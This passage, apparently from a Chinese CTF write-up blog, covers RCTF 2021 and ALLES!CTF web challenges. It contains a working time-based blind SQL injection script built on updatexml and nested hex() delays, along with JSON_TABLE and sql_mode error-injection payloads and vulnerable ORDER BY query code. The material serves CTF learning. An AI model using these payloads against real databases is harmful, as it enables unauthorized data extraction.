class="string">&quot;updatexml(1,concat(&#x27;~&#x27;,(if((substr(hex(user()),%s,1)=&#x27;%s&#x27;),(select+length(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(&#x27;1&#x27;)))))))))))))))))))))))))))))))),&#x27;a&#x27;)),1),1)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;0123456789ABCDEF&quot;</span>:</span><br><span class="line">            payload = tem % (i, c)</span><br><span class="line">            <span class="keyword">if</span> req(payload):</span><br><span class="line">                data += c</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">if</span> i % <span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span> data.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;fail&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2021/09/13/2021-RCTF/image-20210913144624261.png" alt="image-20210913144624261"></p><p>ä¸è¿‡åé¢æˆ‘å°è¯•æ‰“æŒ‚é¢˜ç›®ï¼Œå¥‡æ€ªçš„æ˜¯æ‰“ä¸æŒ‚äº†ã€‚è¿˜ä»¥ä¸ºå‡ºé¢˜äººé™åˆ¶äº†ï¼Œèµ›åé—®å‡ºé¢˜äººæ²¡æ”¹é¢˜ï¼Œåº”è¯¥æ˜¯è®¾ç½®äº† restart alwaysã€‚</p><h2 id="èµ›åäº¤æµ"><a href="#èµ›åäº¤æµ" class="headerlink" title="èµ›åäº¤æµ"></a>èµ›åäº¤æµ</h2><p>ä¸Nu1Lçš„@wupcoå¸ˆå‚…äº¤æµäº†ä¸€ä¸‹ï¼Œä»–è¯´prepareä¼˜å…ˆå¤„ç†updatexmlæ˜¯è€é—®é¢˜äº†ï¼Œä¹‹å‰è§è¿‡orzâ€¦ ä»–ç”¨çš„æ˜¯repeatå‡½æ•°æ¥å»¶è¿Ÿï¼Œä¸è¿‡å¥½åƒæ•ˆæœæ²¡æœ‰hexå¥½ï¼Œä»–è·‘äº†å¥½å‡ æ¬¡çš„æ ·å­ï¼Œæ—¶é—´éƒ½æ˜¯ç²¾ç¡®åˆ°æ¯«ç§’çº§åˆ«çš„ã€‚</p><p>ä¸å‡ºé¢˜äººä¹Ÿäº¤æµäº†ä¸€ä¸‹ï¼Œå‡ºé¢˜çš„æƒ³æ³•æ˜¯å¯¹æŠ—mysqlçš„ä¼˜åŒ–ï¼Œmysql ä¼šæå‰è®¡ç®—ä¸€äº›è¡¨è¾¾å¼ä¹‹ç±»çš„èƒ½é€ æˆå»¶è¿Ÿã€‚æˆ‘åœ¨æ¯”èµ›ä¸­ç”¨çš„æ˜¯mysql client çš„prepareï¼Œæ²¡æƒ³åˆ°è¿™è·Ÿpdoçš„prepareè¿˜æœ‰äº›ä¸åŒã€‚åœ¨å‘½ä»¤è¡Œé‡Œupdatexml prepareå¯ä»¥é€ æˆå»¶æ—¶ï¼Œä½†æ˜¯åœ¨pdoå´ä¸å¯ä»¥ï¼š</p><p><img src="/2021/09/13/2021-RCTF/image-20210913145939837.png" alt="image-20210913145939837"></p><p>æˆ‘åœ¨prepareå‰ï¼Œprepareå’Œexecuteä¸­é—´ä»¥åŠexecuteåéƒ½è¾“å‡ºäº†ä¸€ä¸‹æ—¶é—´ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯åœ¨executeçš„æ—¶å€™æ‰å»¶æ—¶ã€‚æ‰€ä»¥è¿™ä¸¤ä¸ªprepareè¿˜æ˜¯æœ‰äº›ä¸åŒçš„ã€‚</p><p>é™¤äº†updatexmlä»¥å¤–ï¼Œå‡ºé¢˜äººè¿˜æä¾›äº†ä¸€ç§æ–¹å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">    1</span><br><span class="line">FROM</span><br><span class="line">    JSON_TABLE (</span><br><span class="line">        CONCAT (&#39;[&#39;, REPEAT(&#39;1,&#39;, IF(0,1,9999999)), &#39;1]&#39;), &#39;$[*]&#39;</span><br><span class="line">        COLUMNS ( </span><br><span class="line">            NESTED PATH &#39;$&#39; COLUMNS (r INT PATH &#39;$&#39;)</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">AS t</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><img src="/2021/09/13/2021-RCTF/image-20210913150358000.png" alt="image-20210913150358000"></p><p>åˆ©ç”¨ json_table å‡­ç©ºæä¸€ä¸ªè¡¨ã€‚</p><p>ä½†æ˜¯åŸºäº json_table å’Œ updatexml éƒ½æ— æ³•æ³¨æ•°æ®ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯æ— æ³•æ‰§è¡Œ  <code>from table_name</code>ï¼Œä¸€æ—¦å‡ºç°è¿™ä¸ªé€»è¾‘å°±æ²¡æœ‰æ—¶é—´å·®äº†ï¼Œè¿™ä¸prepareçš„å¤„ç†æœ‰å…³ç³»ï¼ˆç°åœ¨åšæ³¨å…¥é¢˜éƒ½éœ€è¦çœ‹mysqlæºç äº†ä¹ˆorzï¼‰ã€‚</p><p>å¦å¤–ä¸€ä¸ªæœ‰è¶£çš„ç‚¹æ˜¯ï¼Œåšé¢˜çš„æ—¶å€™å› ä¸ºæprepareï¼Œæ‰€ä»¥å°±å»ç¿»prepareçš„æ–‡æ¡£ï¼Œå‘ç°äº†è¿™ä¸ªï¼š</p><p><img src="/2021/09/13/2021-RCTF/image-20210913150934739.png" alt="image-20210913150934739"></p><p>8.0.22ç‰ˆæœ¬åprepareåœ¨ç¡®å®šå‚æ•°ç±»å‹è¿™å—æœ‰äº›ä¿®æ”¹ã€‚æ¯”èµ›çš„æ—¶å€™é¢˜ç›®æè¿°é‡Œå†™æ˜äº†mysqlç‰ˆæœ¬æ˜¯8.0.21ï¼Œå½“æ—¶å°±æ„Ÿè§‰è¿™å—ä¼šä¸ä¼šå°±æ˜¯è€ƒç‚¹ï¼Œä½†æ˜¯è”ç³»ä¸ä¸Šã€‚èµ›åè·Ÿå‡ºé¢˜äººäº¤æµï¼Œprepareé‡Œç”¨ updatexml å¯ä»¥é€ æˆå»¶è¿Ÿè§¦å‘çš„åœ°æ–¹å°±æ˜¯ç¡®å®šç±»å‹è¿™é‡Œï¼ˆå‡ºé¢˜äººæ‰’æºç çš„å›¾ï¼‰ï¼š</p><p><img src="/2021/09/13/2021-RCTF/image-20210913152431186.png" alt="image-20210913152431186"></p><p>å…¶ä¸­<code>if (args[1]-&gt;const_item()</code>å°±æ˜¯é™åˆ¶äº†ä¸ç”¨è®¿é—®å…¶ä»–è¡¨ã€‚</p><p>æˆ‘å¯äº†ä¸€ä¸ª8.0.22çš„dockeræµ‹è¯•ï¼Œå‘ç°å¸¸å­—ç¬¦ä¸²è¿˜å¯ä»¥å»¶æ—¶ï¼Œä½†æ˜¯user()è¿™ç§å°±ä¸è¡Œäº†ï¼š</p><p><img src="/2021/09/13/2021-RCTF/image-20210913152822945.png" alt="image-20210913152822945"></p><p>mysql8.0.22åå°±ç»™ä¿®äº†ã€‚</p><h2 id="ns-shaft-sql"><a href="#ns-shaft-sql" class="headerlink" title="ns_shaft_sql"></a>ns_shaft_sql</h2><p>é¢˜ç›®å¤§è‡´æ„æ€æ˜¯æœ‰46å…³ï¼Œæ¯ä¸€å…³ä¼ å…¥ä¸€å¥sqlï¼Œè¦è®©mysqlæŠ¥é”™ï¼Œå¹¶ä¸”æŠ¥é”™ä¿¡æ¯å«æœ‰ç‰¹å®šå­—ç¬¦ä¸²ï¼ˆéœ€è¦ç”¨selectæŸ¥è¯¢ï¼‰ã€‚æ¯è¿‡ä¸€å…³ï¼Œä¼šæŠŠä½ è¿™å…³çš„sqlè¯­å¥é‡Œç”¨åˆ°çš„æ‰€æœ‰å‡½æ•°æå–å‡ºæ¥ï¼Œå†å»ä¸€ä¸ªåä¸º$mysql_functionçš„æ•°ç»„é‡ŒæŸ¥æ‰¾ï¼Œå¦‚æœå­˜åœ¨å°±åŠ å…¥åˆ°é»‘åå•ï¼Œä½ ä¸‹ä¸€å…³å°±ä¸èƒ½ç”¨è¿™ä¸ªå‡½æ•°äº†ã€‚æœ‰ä¸ªä¾‹å¤–ï¼Œunhexå’Œconcatä¸¤ä¸ªå‡½æ•°å¯ä»¥éšä¾¿ä½¿ç”¨ï¼Œç›¸å½“äºåœ¨ç™½åå•é‡Œã€‚</p><p>ç»è¿‡æµ‹è¯•å¸¸è§çš„æŠ¥é”™æ³¨å…¥å‡½æ•°ï¼Œåƒ updatexmlï¼Œextractvalueéƒ½åœ¨è¿™ä¸ªåˆ—è¡¨é‡Œï¼ŒçŒœæµ‹è¿™åº”è¯¥æ˜¯ä¸ªmysqlæ‰€æœ‰å‡½æ•°çš„åˆ—è¡¨ï¼Ÿä¸ºäº†æå‡ºè¿™ä¸ªåˆ—è¡¨ï¼Œæˆ‘æŠŠmysqlæ–‡æ¡£ä¸Šçš„functionåˆ—è¡¨æ‹–äº†ä¸‹æ¥ï¼Œç„¶åå†™äº†ä¸ªè„šæœ¬å»æµ‹è¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">function</span>):</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    content = s.get(<span class="string">&quot;http://124.71.132.232:23334/&quot;</span>).content</span><br><span class="line">    index = content.find(<span class="string">&#x27;key is &#x27;</span>) + <span class="built_in">len</span>(<span class="string">&#x27;key is &#x27;</span>)</span><br><span class="line">    key = content[index:index + <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    sql = <span class="string">&quot;select &#x27;%s&#x27;,updatexml(1,concat(0x7e,(select v from s where k=&#x27;%s&#x27;),0x7e),1)&quot;</span> % (function, key)</span><br><span class="line">    resp = s.get(<span class="string">&quot;http://124.71.132.232:23334/&quot;</span>, params=&#123;<span class="string">&#x27;sql&#x27;</span>: b64encode(sql)&#125;).content</span><br><span class="line">    resp = resp[resp.find(<span class="string">&#x27;floor 2&#x27;</span>):]</span><br><span class="line">    index = resp.find(<span class="string">&quot;Disabled Functions: &quot;</span>) + <span class="built_in">len</span>(<span class="string">&quot;Disabled Functions: &quot;</span>)</span><br><span class="line">    resp = resp[index:]</span><br><span class="line">    resp = resp[:resp.find(<span class="string">&quot;\n&quot;</span>)].strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> resp.startswith(<span class="string">&#x27;updatexml&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = <span class="string">&#x27;&#x27;&#x27;ABS()</span></span><br><span class="line"><span class="string">ACOS()</span></span><br><span class="line"><span class="string">ADDDATE()</span></span><br><span class="line"><span class="string">ADDTIME()</span></span><br><span class="line"><span class="string">AES_DECRYPT()</span></span><br><span class="line"><span class="string">AES_ENCRYPT()</span></span><br><span class="line"><span class="string">AND</span></span><br><span class="line"><span class="string">ANY_VALUE()</span></span><br><span class="line"><span class="string">...&#x27;&#x27;&#x27;</span>.split(<span class="string">&quot;\n&quot;</span>) <span class="comment"># æ­¤å¤„çœç•¥ï¼Œå°±æ˜¯mysqlæ–‡æ¡£ä¸Šçš„functionåˆ—è¡¨</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> function <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="keyword">if</span> test(function):</span><br><span class="line">        <span class="built_in">print</span> function</span><br></pre></td></tr></table></figure><p>å‘ç°å¾ˆå¤šéƒ½åœ¨åˆ—è¡¨é‡Œï¼Œæ‰€ä»¥æŠŠæ²¡åœ¨åˆ—è¡¨é‡Œçš„å‡½æ•°æ‰“å‡ºæ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">AND</span><br><span class="line">BETWEEN</span><br><span class="line">AND</span><br><span class="line">BINARY</span><br><span class="line">CASE</span><br><span class="line">CONCAT</span><br><span class="line">DIV</span><br><span class="line">IS</span><br><span class="line">LAST_DAY</span><br><span class="line">LIKE</span><br><span class="line">LOCALTIMESTAMP</span><br><span class="line">LOCALTIMESTAMP</span><br><span class="line">MATCH</span><br><span class="line">MEMBER</span><br><span class="line">NOT</span><br><span class="line">OR</span><br><span class="line">REGEXP</span><br><span class="line">RLIKE</span><br><span class="line">SHA</span><br><span class="line">SOUNDS LIKE</span><br><span class="line">ST_AsWKB</span><br><span class="line">ST_AsWKT</span><br><span class="line">ST_GeometryCollectionFromText</span><br><span class="line">ST_GeomCollFromTxt()</span><br><span class="line">ST_GeometryCollectionFromWKB()</span><br><span class="line">ST_GeometryFromText()</span><br><span class="line">ST_GeometryFromWKB()</span><br><span class="line">ST_LineStringFromText()</span><br><span class="line">ST_LineStringFromWKB()</span><br><span class="line">ST_FromText()</span><br><span class="line">ST_MultiLineStringFromWKB()</span><br><span class="line">ST_MultiPointFromText()</span><br><span class="line">ST_MultiPointFromWKB()</span><br><span class="line">ST_MultiPolygonFromText()</span><br><span class="line">ST_MultiPolygonFromWKB()</span><br><span class="line">ST_NumInteriorRings()</span><br><span class="line">ST_PolygonFromText()</span><br><span class="line">ST_PolygonFromWKB()</span><br><span class="line">UNHEX()</span><br><span class="line">UPPER()</span><br><span class="line">USER()</span><br><span class="line">UTC_DATE()</span><br><span class="line">UTC_TIME()</span><br><span class="line">UTC_TIMESTAMP()</span><br><span class="line">UUID()</span><br><span class="line">UUID_SHORT()</span><br><span class="line">UUID_TO_BIN()</span><br><span class="line">VALIDATE_PASSWORD_STRENGTH()</span><br><span class="line">VALUES()</span><br><span class="line">VAR_POP()</span><br><span class="line">VAR_SAMP()</span><br><span class="line">VARIANCE()</span><br><span class="line">VERSION()</span><br><span class="line">WAIT_FOR_EXECUTED_GTID_SET()</span><br><span class="line">WAIT_UNTIL_SQL_THREAD_AFTER_GTIDS()</span><br><span class="line">WEEK()</span><br><span class="line">WEEKDAY()</span><br><span class="line">WEEKOFYEAR()</span><br><span class="line">WEIGHT_STRING()</span><br><span class="line">XOR</span><br><span class="line">YEAR()</span><br><span class="line">YEARWEEK()</span><br></pre></td></tr></table></figure><p>è¿™äº›éƒ½æ˜¯éšæ„ä½¿ç”¨æ²¡æœ‰æ¬¡æ•°é™åˆ¶çš„ï¼Œå‘ç°äº†ä¸€äº›STå¼€å¤´çš„æ²¡è¢«banï¼Œå°è¯•äº†å‡ ä¸‹ä¸è¡Œã€‚èµ›åé—®0opså¸ˆå‚…çš„åšæ³•ï¼Œå°±æ˜¯åˆ©ç”¨<code>ST_LineStringFromText</code>è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘çš„å§¿åŠ¿ä¸å¯¹â€¦</p><p><img src="/2021/09/13/2021-RCTF/image-20210913155818724.png" alt="image-20210913155818724"><br>åªæœ‰ä¼ å…¥ä¸€äº›ç‰¹å®šå‚æ•°æ‰èƒ½è§¦å‘ã€‚</p><p>Nu1Lçš„wupcoå¸ˆå‚…ç”¨çš„æ˜¯è¿™ä¸ªexpï¼š<code>set @@sql_mode:=(select concat(0x22,v) from s where k=&#39;xxx&#39;);</code>ï¼Œå¾ˆå·§å¦™ã€‚</p><p>ä¸å‡ºé¢˜äººäº¤æµï¼Œå‡ºé¢˜äººè¡¨ç¤ºé¢„æœŸå°±æ˜¯ç”¨46ç§ä¸åŒçš„æ–¹å¼æ¥æŠ¥é”™ï¼Œè¿™ä¸¤ä¸ªè§£æ³•éƒ½å±äºéé¢„æœŸã€‚é‚£ä¸ªmysql function list åŸæ„æ˜¯æ‰€æœ‰çš„mysqlå‡½æ•°ï¼Œä½†æ˜¯ä¸å…¨å¯¼è‡´äº† 0ops å¸ˆå‚…çš„éé¢„æœŸã€‚</p><p>é¢„æœŸè§£æ˜¯çœ‹mysqlæºç ï¼Œç†è§£æŠ¥é”™åŸå› ï¼Œåå‘å®šä½æ‰¹é‡æ‰¾ã€‚ç¼–è¯‘ä¸€ä¸ªdebugç‰ˆæœ¬çš„mysqlï¼Œç„¶åç”¨vscode +gdbåŠ¨æ€è°ƒè¯•â€¦ å…·ä½“çœ‹å®˜æ–¹wpå§ã€‚</p><p>å…¶ä»–é¢˜ç›®æœ‰æ—¶é—´å†å¤ç°å§â€¦ verysafeå¬è¯´ç±»ä¼¼2020å·…å³°æå®¢åˆèµ›ä¸€é“é¢˜ï¼Œåˆ©ç”¨pearcmd.phpï¼Œå†ç»“åˆ caddy ä¸€ä¸ªç›®å½•ç©¿è¶Šã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 ALLES!CTF Amazing Crypto WAF</title>
      <link href="/2021/09/05/2021-ALLESCTF/"/>
      <url>/2021/09/05/2021-ALLESCTF/</url>
      
        <content type="html"><![CDATA[<p>è¿™å‘¨æœ«æœ¬æ¥åœ¨èµ¶æŠ¥å‘Šddlï¼Œå†™æŠ¥å‘Šå†™ç´¯äº†å‡†å¤‡å»çœ‹çœ‹é¢˜ä¼‘æ¯ä¸€ä¸‹ï¼Œæ²¡æƒ³åˆ°ä¸€é“é¢˜çœ‹äº†å…­ä¸ƒä¸ªå°æ—¶å¡ä½ï¼Œæµªè´¹äº†å¾ˆå¤šæ—¶é—´.. è®°å½•ä¸‹è¿™é“é¢˜ã€‚</p><a id="more"></a><h2 id="Amazing-Crypto-WAF"><a href="#Amazing-Crypto-WAF" class="headerlink" title="Amazing Crypto WAF"></a>Amazing Crypto WAF</h2><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™äº†dockerï¼Œæµè§ˆä¸€éï¼Œä¸¤ä¸ªcontainerï¼Œå¼€æ”¾æœåŠ¡çš„containeræ˜¯ä¸ªä»£ç†ï¼Œè½¬å‘è¯·æ±‚åˆ°å†…éƒ¨containerã€‚proxyä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/&lt;path:path&gt;&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy</span>(<span class="params">path</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Web Application Firewall</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        waf_param(request.args)</span><br><span class="line">        waf_param(request.form)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># contact backend server</span></span><br><span class="line">    proxy_request = <span class="literal">None</span></span><br><span class="line">    query = request.query_string.decode()</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Cookie&#x27;</span>: request.headers.get(<span class="string">&#x27;Cookie&#x27;</span>, <span class="literal">None</span>) &#125;</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        proxy_request = requests.get(<span class="string">f&#x27;<span class="subst">&#123;BACKEND_URL&#125;</span><span class="subst">&#123;path&#125;</span>?<span class="subst">&#123;query&#125;</span>&#x27;</span>,</span><br><span class="line">                            headers=headers,</span><br><span class="line">                            allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        headers[<span class="string">&#x27;Content-type&#x27;</span>] = request.content_type</span><br><span class="line">        proxy_request = requests.post(<span class="string">f&#x27;<span class="subst">&#123;BACKEND_URL&#125;</span><span class="subst">&#123;path&#125;</span>?<span class="subst">&#123;query&#125;</span>&#x27;</span>, </span><br><span class="line">                            data=encrypt_params(request.form),</span><br><span class="line">                            headers=headers,</span><br><span class="line">                            allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proxy_request:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    response_data = decrypt_data(proxy_request.content)</span><br><span class="line">    injected_data = inject_ad(response_data)</span><br><span class="line">    resp = make_response(injected_data)</span><br><span class="line">    resp.status = proxy_request.status_code</span><br><span class="line">    <span class="keyword">if</span> proxy_request.headers.get(<span class="string">&#x27;Location&#x27;</span>, <span class="literal">None</span>):</span><br><span class="line">        resp.headers[<span class="string">&#x27;Location&#x27;</span>] = proxy_request.headers.get(<span class="string">&#x27;Location&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> proxy_request.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>, <span class="literal">None</span>):</span><br><span class="line">        resp.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>] = proxy_request.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> proxy_request.headers.get(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="literal">None</span>):</span><br><span class="line">        resp.content_type = proxy_request.headers.get(<span class="string">&#x27;Content-Type&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªwafï¼Œè¿‡æ»¤æ‰€æœ‰çš„getå‚æ•°å’Œpostå‚æ•°ï¼Œwaf æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/image-20210905131132515.png" alt="image-20210905131132515"></p><p>è¿™ä¸ªä»£ç†è¿˜æœ‰ä¸€ä¸ªåŠ å¯†åŠŸèƒ½ï¼Œä¼šæŠŠpostçš„éƒ¨åˆ†å‚æ•°å€¼åœ¨è¯·æ±‚å‰ä½¿ç”¨AESåŠ å¯†ï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/image-20210905131332584.png" alt="image-20210905131332584"></p><p>å¯ä»¥çœ‹åˆ°ä¸€äº›å‚æ•°æ˜¯ä¸åŠ å¯†ã€‚åŠ å¯†ç»“æœæ˜¯<code>ENCRYPT:xxx</code>æ ¼å¼ï¼Œåœ¨å¾—åˆ°å†…å±‚containerçš„å“åº”åï¼Œè¿™ä¸ªä»£ç†ä¼šæ­£åˆ™åŒ¹é…<code>ENCRYPT:xxx</code>æ ¼å¼çš„æ•°æ®ï¼Œè¿›è¡Œè§£å¯†æ›¿æ¢å¯†æ–‡å†è¿”å›ç»™æˆ‘ä»¬ã€‚</p><p>è€Œå†…å±‚containerï¼Œsqlite æ•°æ®åº“ï¼Œæœ‰ç™»é™†/æ³¨å†Œã€å¢åˆ notesã€æŸ¥çœ‹notesåŠŸèƒ½ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/notes&#x27;)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">notes</span>():</span></span><br><span class="line">    order = request.args.get(<span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;desc&#x27;</span>)</span><br><span class="line">    notes = query_db(<span class="string">f&#x27;select * from notes where user = ? order by timestamp <span class="subst">&#123;order&#125;</span>&#x27;</span>, [g.user[<span class="string">&#x27;uuid&#x27;</span>]])</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;notes.html&#x27;</span>, user=g.user, notes=notes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/delete_note&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>():</span></span><br><span class="line">    user = g.user[<span class="string">&#x27;uuid&#x27;</span>]</span><br><span class="line">    note_uuid = request.form[<span class="string">&#x27;uuid&#x27;</span>]</span><br><span class="line">    commit_db(<span class="string">&#x27;delete from notes where uuid = ? and user = ?&#x27;</span>, [note_uuid, user])</span><br><span class="line">    <span class="keyword">return</span> redirect(<span 